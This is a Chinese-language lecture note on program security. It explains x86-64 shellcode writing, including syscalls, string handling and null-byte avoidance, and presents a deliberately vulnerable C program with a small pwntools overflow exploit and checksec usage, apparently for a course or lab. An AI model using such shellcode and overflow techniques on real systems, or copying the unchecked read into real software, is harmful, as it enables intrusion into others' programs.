# 4-05：程序安全

![](img/db2a240f7239f38229334474c4366a18_0.png)

![](img/db2a240f7239f38229334474c4366a18_2.png)

## 概述

![](img/db2a240f7239f38229334474c4366a18_4.png)

![](img/db2a240f7239f38229334474c4366a18_6.png)

在本节课中，我们将要学习程序安全的核心概念，特别是Shellcode编写和内存破坏。我们将通过实际操作演示如何编写Shellcode，并探讨如何利用缓冲区溢出等内存破坏漏洞。课程内容旨在复习和巩固相关知识，适合初学者跟随学习。

![](img/db2a240f7239f38229334474c4366a18_8.png)

![](img/db2a240f7239f38229334474c4366a18_10.png)

![](img/db2a240f7239f38229334474c4366a18_12.png)

---

## Shellcode编写基础

上一节我们介绍了程序安全的整体概念，本节中我们来看看如何实际编写Shellcode。Shellcode是一段用于利用软件漏洞的机器码，通常用于启动一个shell或执行特定操作。

### 设置环境与调用系统调用

首先，我们需要设置汇编环境并了解如何调用系统调用。在x86-64架构中，系统调用通过设置特定寄存器并执行`syscall`指令来完成。

以下是设置`open`系统调用的示例代码：

```assembly
mov rax, 2        ; syscall number for open
lea rdi, [rip + path] ; load address of path string
mov rsi, 0        ; flags: O_RDONLY
mov rdx, 0        ; mode (not used here)
syscall           ; trigger the syscall
```

在这段代码中：
- `rax`寄存器存储系统调用号（`open`为2）。
- `rdi`寄存器存储文件路径的地址。
- `rsi`寄存器存储打开文件的标志（如`O_RDONLY`）。
- `rdx`寄存器存储文件模式（本例中未使用）。
- `syscall`指令触发系统调用。

### 处理字符串数据

在Shellcode中处理字符串数据有多种方法。一种常见的方法是将字符串数据放在代码段之后，并通过相对地址加载。

以下是声明字符串并加载其地址的示例：

![](img/db2a240f7239f38229334474c4366a18_14.png)

![](img/db2a240f7239f38229334474c4366a18_16.png)

![](img/db2a240f7239f38229334474c4366a18_18.png)

```assembly
path:
    .string "/home/hacker/somefile"
```

![](img/db2a240f7239f38229334474c4366a18_20.png)

使用`lea`指令加载字符串地址：

```assembly
lea rdi, [rip + path]
```

这种方法将字符串数据放在Shellcode的末尾，并通过相对寻址获取其地址。

![](img/db2a240f7239f38229334474c4366a18_22.png)

![](img/db2a240f7239f38229334474c4366a18_24.png)

![](img/db2a240f7239f38229334474c4366a18_26.png)

![](img/db2a240f7239f38229334474c4366a18_27.png)

![](img/db2a240f7239f38229334474c4366a18_29.png)

![](img/db2a240f7239f38229334474c4366a18_31.png)

![](img/db2a240f7239f38229334474c4366a18_33.png)

![](img/db2a240f7239f38229334474c4366a18_35.png)

![](img/db2a240f7239f38229334474c4366a18_37.png)

### 避免使用特定字节

![](img/db2a240f7239f38229334474c4366a18_39.png)

![](img/db2a240f7239f38229334474c4366a18_41.png)

在某些情况下，我们需要避免在Shellcode中使用特定字节（如空字节）。以下是几种清零寄存器的方法，每种方法产生的机器码字节不同：

1. **使用`mov`指令**：
   ```assembly
   mov eax, 0
   ```

2. **使用`xor`指令**：
   ```assembly
   xor eax, eax
   ```

3. **使用`sub`指令**：
   ```assembly
   sub eax, eax
   ```

4. **使用`and`指令**：
   ```assembly
   and eax, 0
   ```

每种方法都有其独特的字节序列，可以根据需要选择合适的方法来避免特定字节。

### 使用栈存储数据

另一种处理字符串数据的方法是使用栈。通过将字符串压入栈中，可以动态构建数据。

以下是使用栈存储字符串的示例：

![](img/db2a240f7239f38229334474c4366a18_43.png)

```assembly
push 0            ; null terminator
mov rax, 0x656c69666d6f732f ; "somefile"
push rax
lea rdi, [rsp]    ; load address from stack
```

![](img/db2a240f7239f38229334474c4366a18_45.png)

![](img/db2a240f7239f38229334474c4366a18_47.png)

![](img/db2a240f7239f38229334474c4366a18_49.png)

这种方法将字符串分块压入栈中，并通过栈指针获取其地址。

---

## 内存破坏与缓冲区溢出

![](img/db2a240f7239f38229334474c4366a18_51.png)

![](img/db2a240f7239f38229334474c4366a18_52.png)

上一节我们介绍了Shellcode编写的基础，本节中我们来看看内存破坏，特别是缓冲区溢出。缓冲区溢出是一种常见的安全漏洞，当程序向缓冲区写入的数据超过其分配的大小时，会导致相邻内存被覆盖。

![](img/db2a240f7239f38229334474c4366a18_54.png)

![](img/db2a240f7239f38229334474c4366a18_56.png)

![](img/db2a240f7239f38229334474c4366a18_57.png)

### 缓冲区溢出示例

![](img/db2a240f7239f38229334474c4366a18_59.png)

以下是一个简单的C程序，演示了缓冲区溢出漏洞：

![](img/db2a240f7239f38229334474c4366a18_61.png)

![](img/db2a240f7239f38229334474c4366a18_63.png)

```c
#include <stdio.h>
#include <unistd.h>

struct mystruct {
    char username[64];
    int always_false;
};

void vulnerable() {
    struct mystruct s;
    s.always_false = 0;
    printf("What is your name? ");
    read(0, s.username, 300); // buffer overflow here
    printf("Hello %s\n", s.username);
    if (s.always_false) {
        printf("always_false is true!\n");
    }
}

int main() {
    printf("About to call vulnerable function\n");
    vulnerable();
    printf("About to return from main\n");
    return 0;
}
```

在这个程序中，`read`函数允许写入最多300字节的数据，但`username`缓冲区只有64字节。当写入超过64字节时，`always_false`变量会被覆盖。

### 利用缓冲区溢出

通过精心构造输入数据，我们可以覆盖`always_false`变量，使其变为非零值，从而触发本不应执行的条件分支。

以下是利用该漏洞的Python脚本示例：

```python
from pwn import *

context.arch = 'amd64'
p = process('./a.out')

# Send 72 'A's to overflow the buffer and overwrite always_false
payload = b'A' * 72
p.send(payload)
p.interactive()
```

当发送72字节的`A`时，`always_false`变量被覆盖，程序输出`always_false is true!`。

### 检查二进制文件的安全特性

在分析二进制文件时，可以使用`checksec`工具检查其安全特性，如栈保护、地址空间布局随机化等。

以下是使用`checksec`的示例：

![](img/db2a240f7239f38229334474c4366a18_65.png)

![](img/db2a240f7239f38229334474c4366a18_67.png)

![](img/db2a240f7239f38229334474c4366a18_69.png)

![](img/db2a240f7239f38229334474c4366a18_71.png)

```bash
checksec ./a.out
```

![](img/db2a240f7239f38229334474c4366a18_73.png)

![](img/db2a240f7239f38229334474c4366a18_75.png)

![](img/db2a240f7239f38229334474c4366a18_77.png)

![](img/db2a240f7239f38229334474c4366a18_79.png)

输出可能显示：
- `No canary found`：栈保护未启用。
- `PIE disabled`：地址空间布局随机化未启用。

这些信息有助于了解二进制文件的漏洞利用难度。

![](img/db2a240f7239f38229334474c4366a18_81.png)

---

## 总结

![](img/db2a240f7239f38229334474c4366a18_83.png)

![](img/db2a240f7239f38229334474c4366a18_85.png)

![](img/db2a240f7239f38229334474c4366a18_86.png)

![](img/db2a240f7239f38229334474c4366a18_88.png)

![](img/db2a240f7239f38229334474c4366a18_90.png)

本节课中我们一起学习了程序安全的核心概念，包括Shellcode编写和内存破坏。我们通过实际操作演示了如何编写Shellcode、避免特定字节、利用缓冲区溢出漏洞，并介绍了相关工具的使用方法。掌握这些知识对于理解和防御软件安全漏洞至关重要。